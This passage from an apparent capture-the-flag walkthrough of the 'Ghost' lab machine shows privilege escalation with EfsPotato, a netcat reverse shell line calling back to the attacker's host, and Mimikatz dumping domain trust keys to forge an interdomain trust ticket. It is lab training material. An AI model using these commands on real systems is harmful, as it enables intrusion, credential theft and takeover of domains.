PRIMARY</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f78058987ecc04246014d1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f7808c8a15fb0af305b8cb" class="Divider"></div><h3 id="https://www.notion.so/1fe0b98a88f780cd9384d66866eca96e" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1fe0b98a88f780cd9384d66866eca96e"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">PRIMARY\nt service\mssqlserver</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/1fe0b98a88f780318364eaf07f87008f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Potato Attack:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7806f96e6c87592977fa2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Escalating from here should be relatively straightforward, as service accounts often have impersonate privileges, which can be abused with Potato attacks.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f7808bbcf4db026acf66b7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Windows\system32&gt;</span></mark></span><span class="SemanticString"><span> whoami /priv


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f78057af2cd4d523718f49" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/BeichenDream/GodPotato">GodPotato</a></span><span class="SemanticString"> is usually quite reliable and had been used in previous boxes like </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://ch3ng625.github.io/flight">Flight</a></span><span class="SemanticString"> and </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://ch3ng625.github.io/visual">Visual</a></span><span class="SemanticString">. However, Defender is active on this server, and the exe file is immediately deleted upon upload.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780178e81fc069ffe4793" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll use </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/zcgonvh/EfsPotato">EfsPotato</a></span><span class="SemanticString"> instead, which is undetected by Defender. There’s no pre-built binaries available, and has to be compiled on the server.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780538a08e47ab4dcdd58" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\Public\Documents&gt;</span></mark></span><span class="SemanticString"><span> c:\windows\microsoft.net\framework\v4.0.30319\csc.exe efspotato.cs -nowarn:1691,618

Microsoft (R) Visual C# Compiler version 4.8.4161.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240


</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\Public\Documents&gt;</span></mark></span><span class="SemanticString"><span> dir

 Volume in drive C has no label.
 Volume Serial Number is 161D-1BB7

 Directory of c:\Users\Public\Documents

01/15/2025  07:08 AM    &lt;DIR&gt;          .
01/30/2024  07:28 PM    &lt;DIR&gt;          ..
01/15/2025  07:04 AM            25,441 efspotato.cs
01/15/2025  07:08 AM            17,920 efspotato.exe
01/15/2025  06:44 AM            45,272 nc64.exe
               3 File(s)         88,633 bytes
               2 Dir(s)   3,978,080,256 bytes free

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\Public\Documents&gt;</span></mark></span><span class="SemanticString"><span> .\efspotato.exe &quot;whoami&quot;

Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH&#x27;s fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=1a5453c0)
[+] Get Token: 880
[!] process with pid: 3664 created.
==============================
nt authority\system</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f7803e9958ca7532bd1655" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll call the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc</code></span><span class="SemanticString"> binary uploaded earlier for the revshell:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780208ecfdf3e5c5e63b9" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\Public\Documents&gt;</span></mark></span><span class="SemanticString"><span> .\efspotato.exe &quot;nc64.exe 10.10.14.93 8001 -e cmd.exe&quot;

Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH&#x27;s fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=c8e6e0)
[+] Get Token: 880
[!] process with pid: 2132 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780fcaaeae54d6619c002" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now I’m </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nt authority\system</code></span><span class="SemanticString"> on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">PRIMARY</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f78030b84cf631c3a3259f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001

listening on [any] 8001 ...
connect to [10.10.14.93] from (UNKNOWN) [10.129.231.105] 49853
Microsoft Windows [Version 10.0.20348.2582]
(c) Microsoft Corporation. All rights reserved.

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\Public\Documents&gt;</span></mark></span><span class="SemanticString"><span> whoami

nt authority\system</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780f5bf74f39a14b8cb7f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, no root flag was found. It’s not quite done yet.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780c1a194fba001f96acf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f7807b9b4cf73938d66c07" class="Divider"></div><h3 id="https://www.notion.so/1fe0b98a88f780299851deb371ff2702" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1fe0b98a88f780299851deb371ff2702"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">PRIMARY\nt authority\system</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/1fe0b98a88f780f7a377dcb68814107c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Network Layout:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7802cb0d2e66d19a75020" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">PRIMARY</code></span><span class="SemanticString"> is located in an internal network, with an IP address of 10.0.0.10:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780ffa532d38e704dfbc7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\Public\Documents&gt;</span></mark></span><span class="SemanticString"><span> ipconfig


Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.0.0.10
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.0.254</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f7807dab57e8c13d34cdd1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It’s default gateway is 10.0.0.254, which is the internal IP address of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">DC01</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780f9addbded5340d4ba2" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\justin.bradley\Documents&gt;</span></mark></span><span class="SemanticString"><span> ipconfig

Windows IP Configuration


Ethernet adapter vEthernet (internal):

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.0.0.254
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.231.105
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f7804d9978db02d7738696" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A default gateway is the IP address a system use to send traffic destined for networks outside its own subnet. This means that all outbound traffic from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">PRIMARY</code></span><span class="SemanticString"> to external networks are routed through </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">DC01</code></span><span class="SemanticString">, which acts as a bridge between them.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78078b1bbee603f179669" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Also, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">PRIMARY</code></span><span class="SemanticString"> does not have an external interface, so it’s not directly reachable from the outside.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7803d811adfa265d1e101" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f78011a605de9d84588e43" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Domain Trusts:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780f395e0f244a46be6fc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll run BloodHound again, as the internal network wasn’t accessible during the initial scan. </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">PRIMARY</code></span><span class="SemanticString"> is the domain controller of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">corp.ghost.htb</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780d38f2cc9dfc37c0c99" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/bh_primary_dc.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/bh_primary_dc.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f7803b8c5bec46cce0982e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s also bidirectional trust between </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ghost.htb</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">corp.ghost.htb</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7809d9fa4e87dfac01e7a" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/bh_trust.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/bh_trust.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f780c2b90ac987b39fbeab" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust">domain trust</a></span><span class="SemanticString"> is a relationship established between two domains that allows users to share resources between them. In a bidirectional trust relationship, both domains trust each other, and authentication requests can be passed between them in either directions. Since I already have control of the DC of a domain trusted by </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ghost.htb</code></span><span class="SemanticString">, I can leverage the trust relationship to impersonate users or escalate privileges across domains.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780cab6aeeb422ab8e0b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f780009ad9ec5cf2c6e831" class="Divider"></div><h3 id="https://www.notion.so/1fe0b98a88f7803184a9dbd3c672c319" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1fe0b98a88f7803184a9dbd3c672c319"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation:</span></span></h3><div id="https://www.notion.so/1fe0b98a88f780cd8e1de35dbc8deb9a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Forging Trust Ticket:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780e089e6c08fc375bb52" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">When you think about it, Kerberos conceptually functions in a similar way to SAML authentication. It acts as an identity provider within the domain, and issues tickets — specifically TGS — that prove a user’s identity to other Windows services. When accessing services in a foreign trusted domain, the KDC issues a special interdomain trust ticket, which is presented to the foreign domain’s KDC who then issues the TGS for the requested service.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780ca87f3c3c229b3ce11" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SYSTEM</code></span><span class="SemanticString"> user on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">PRIMARY</code></span><span class="SemanticString">, I effectively have full control of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">corp.ghost.htb</code></span><span class="SemanticString">&#x27;s KDC, and can forge interdomain trust tickets for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">DC01</code></span><span class="SemanticString">, much like a Golden SAML attack.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78025a2d4c4a3f8ecb810" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://medium.com/r3d-buck3t/breaking-domain-trusts-with-forged-trust-tickets-5f03fb71cd72">This blog post</a></span><span class="SemanticString"> has an excellent example of such attack. To start, I’ll use Mimikatz’s </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">lsadump::trust</code></span><span class="SemanticString"> module to dump out trust keys and a bunch of information about the domain trust relationships.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f78062b152db1f396b0e45" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\Public\Documents&gt;</span></mark></span><span class="SemanticString"><span> .\mimikatz.exe


  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mimikatz #</span></mark></span><span class="SemanticString"><span> lsadump::trust /patch

Current domain: CORP.GHOST.HTB (GHOST-CORP / S-1-5-21-2034262909-2733679486-179904498)

Domain: GHOST.HTB (GHOST / S-1-5-21-4084500788-938703357-3654145966)
 [  In ] CORP.GHOST.HTB -&gt; GHOST.HTB
    * 5/25/2025 2:12:47 AM - CLEAR   - 7c dc 82 26 65 97 cd 7e fe 93 e3 06 74 73 ee d1 1e e7 99 7b 7b 25 64 42 0b d8 9d 55 5a a6 7b 40 52 b3 9e 07 fc e9 89 fb 88 26 fb aa 10 ca 36 ef db b6 59 1d 15 f0 35 2e 63 f4 a1 d5 f0 33 e4 0d 55 16 13 76 f7 e6 a8 05 29 c1 6f 03 13 f8 6e 6b f7 39 5a fb 8d 41 53 8e f2 a2 24 d3 7f 70 aa 41 8d f7 27 f3 8c dc a1 36 3b b6 ca 8d dc bb 8f 2e 53 49 a5 58 65 04 63 d7 ca d2 4b a1 69 5b b1 59 21 5c 09 98 f1 c2 7e a3 4a a7 17 cf 67 6a 90 97 37 ef 9b 82 8c 7d f1 83 c0 8a 41 f7 a8 00 ad 94 15 a3 a1 00 24 1a 76 d8 12 30 58 f8 72 03 f2 20 20 6a af a5 1d 20 78 d2 11 4f a1 c6 bb 88 76 a8 fd e3 30 a6 ae 71 58 dc 1f 48 97 08 21 c2 c2 ab e4 24 ff 1b 30 70 5f 5b e2 41 99 58 4d aa 47 12 69 d3 76 e3 b6 a2 a1 a6 34 9a 62 3a ac 90 2b 4d 
	* aes256_hmac       86dab0fc63f7a3f6ab216f47cc7613a2833bf55ff8db7ec7df037922c809a097
	* aes128_hmac       b05a74d12ab15951f790ed34e89150cc
	* rc4_hmac_nt       053fc16b43d14e3a3ade43c1f2c259f6

 [ Out ] GHOST.HTB -&gt; CORP.GHOST.HTB
    * 5/25/2025 2:24:45 AM - CLEAR   - 66 51 47 42 b8 f0 79 e8 7d b0 d3 fd 13 44 06 4a 82 3b e5 19 ba f1 2e 12 c4 3c 72 da 3d b8 74 0f 09 51 92 11 7e e8 f0 95 04 2d a8 da 20 c8 aa d9 0e 8f ad 68 67 f9 52 ed f9 ce 31 8e 33 31 a5 5d 9a bf 4b de 5a f6 63 0c 42 6e 51 bd d2 a9 d5 80 08 8c d4 96 f6 9d af 45 a1 fa 39 dc 47 88 08 41 8f fb 95 ae df d6 d7 6f a3 d6 6b 9f 0f a5 e9 79 3d 9e 35 d6 5d 28 02 59 b0 26 75 96 f2 92 d5 83 d2 74 38 5f fd 04 c6 be f8 54 ed 76 49 d0 6a d8 dc f1 f7 33 79 17 3a fc 1c 22 05 df 65 21 60 82 08 f0 1c 26 21 1a c1 7a 71 d8 fa cb e0 eb b1 86 d1 fb ae 6e 8e 3c 2d 1e 7f f4 20 c5 22 6a 24 cc a3 8d c3 b4 27 9c b7 c0 60 2b a6 2f 6e 2b 12 a0 5f b0 0b 33 19 5b 6f 33 19 cf 49 3b b0 91 4e 52 43 58 40 dd da 97 cd 65 b0 1a f9 bc ba f6 50 ee 
	* aes256_hmac       f8fae023a945f704ae83693760f20b5003dd0d63935887be51adb2d9ca730577
	* aes128_hmac       1498440b109c177363f92398da939a88
	* rc4_hmac_nt       1e494086a5706e92eeb5b037e1a9226d

 [ In-1] CORP.GHOST.HTB -&gt; GHOST.HTB
    * 7/22/2024 9:21:26 AM - CLEAR   - de 0b 64 63 58 9d ed e1 bc 36 c0 50 7c 4d 41 6d bd 82 72 e9 98 9b 13 58 b8 68 f1 94 8c ca 12 50 9b af 45 7d 0a 4d 4e 40 e2 7d 12 59 72 2f 87 22 64 c8 fa b2 96 8d aa c1 f1 17 a3 e7 aa 2b ec 87 b5 59 57 71 6f 33 87 4c e0 8a 8b 03 38 a2 71 b6 d5 0b 61 fd 7e 14 3e 46 16 d9 29 d8 f6 f9 05 69 3f b7 4f c1 28 0b 7e ec e5 46 ab 7e e8 2c 8b be 70 b5 d9 6c 96 1b fb 56 33 bc 41 15 b5 73 42 25 54 15 4b b6 fc 55 07 81 60 4a 6b 4c 22 a2 55 61 e5 91 e6 75 e3 62 d4 9a 37 77 bd 63 90 8e 6a 2a 2c c6 88 8f 57 44 7a 9e 35 aa e5 6a 2b 5f c8 0a 8c 4f cb bd af c9 60 59 ff 15 d9 fd cf 27 93 9f f7 19 9e 91 2b 38 d7 0e ec c9 43 e6 8c 3b 60 02 5f b7 c3 c1 67 c2 6b 44 db 1f 9c f7 72 2f 3a 54 6e 62 02 c9 46 d1 b7 3d 26 54 d0 4f 35 65 a8 3f 
	* aes256_hmac       de2e49c70945c0cb0dec99c93587de84f0b048843b8e295c6da720ba85545ffe
	* aes128_hmac       b55ca148bc95f95b8cb72f67661e1a08
	* rc4_hmac_nt       0b0124f5d6c07ad530d6bf6a6404fdaa

 [Out-1] GHOST.HTB -&gt; CORP.GHOST.HTB
    * 5/25/2025 2:24:45 AM - CLEAR   - 78 10 13 24 91 0a 57 22 71 4e f6 ef 53 6a d8 54 02 97 63 0b 78 28 41 b7 5e 5e e6 b7 50 03 35 96 f2 e5 8b a3 c1 21 fa f6 01 f5 5f 7b 38 98 bc 8b 2b f5 3e 91 ce 8a 01 06 59 c0 9b 19 8c d8 d3 1a 17 9f d4 f1 b2 cb a0 49 f6 7f 97 f7 a0 79 63 bb 20 4a bf a3 d9 dd b1 13 20 c6 a0 84 a2 ea 65 79 6a b6 d3 db 17 e9 be b8 c1 35 57 38 c8 3b a6 6a 90 32 66 ba 0e bd fd 67 bf f4 e9 3c f2 e5 37 94 84 d6 c0 71 d3 42 85 ef 4e 94 ac 56 0f df 05 77 1b 74 57 4f a2 07 07 a1 d6 8e ee a1 cd 6a c0 4c d9 3f 16 0a fa 47 07 45 45 ad b5 6d e4 01 b1 e4 bf 76 c2 8e 5b 4e f4 04 ed 08 e4 e0 7e d8 18 5a f5 df 07 c3 97 3d 7e 6d 28 1e c1 1a ec 6d 06 83 0f 27 ea c8 00 af 92 c9 1f f6 50 45 f5 c1 bb 4a 09 bb d6 df 6b cf d6 fe fe d8 44 bb 19 90 46 0b 
	* aes256_hmac       b50449e019e0a55f9227fb2e830b044e9e9ad9952e2249e5de29f2027cd8f40d
	* aes128_hmac       81f4c2f21a640eed29861d71a619b4bb
	* rc4_hmac_nt       ea4e9954536eb29091fc96bbce83be23</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780a582d6e94861bf4bb5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s 4 trust relationships listed, but the first entry is the important one, as it represents the incoming trust from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ghost.htb</code></span><span class="SemanticString"> to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">corp.ghost.htb</code></span><span class="SemanticString">. Also, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">rc4_hmac_nt</code></span><span class="SemanticString"> is the trust key that’s used to encrypt the ticket.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780ad81a8f0eb16d18eef" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll use the information above to forge the trust ticket. The Mimikatz command is very similar to the one used for a</span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.netwrix.com/how_golden_ticket_attack_works.html"> Golden Ticket attack</a></span><span class="SemanticString">, except I’m using the trust key instead of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">krbtgt</code></span><span class="SemanticString">&#x27;s hash.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7800da45adb5b9800b060" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/sids</code></span><span class="SemanticString"> parameter specifies additional SIDs to include in the user’s </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.thehacker.recipes/ad/persistence/sid-history">SIDHistory</a></span><span class="SemanticString"> attribute. This attribute is typically used for supporting domain migrations. When an object is moved to a new domain, it gets assigned a new SID, but its original SIDs are preserved in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SIDHistory</code></span><span 